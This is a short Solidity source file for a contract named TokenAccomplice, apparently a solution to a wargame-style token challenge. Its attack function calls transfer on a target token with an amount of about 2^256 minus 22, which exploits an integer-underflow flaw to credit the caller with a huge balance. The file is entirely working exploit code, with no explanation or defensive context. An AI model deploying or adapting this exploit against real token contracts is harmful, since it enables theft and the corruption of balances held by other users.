// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract TokenAccomplice {

  uint256 inputVal;

  constructor() {
    inputVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935 - 21;
  }

  function attack(address _tokenAddr) external {
      IToken(_tokenAddr).transfer(msg.sender, inputVal);
  }
}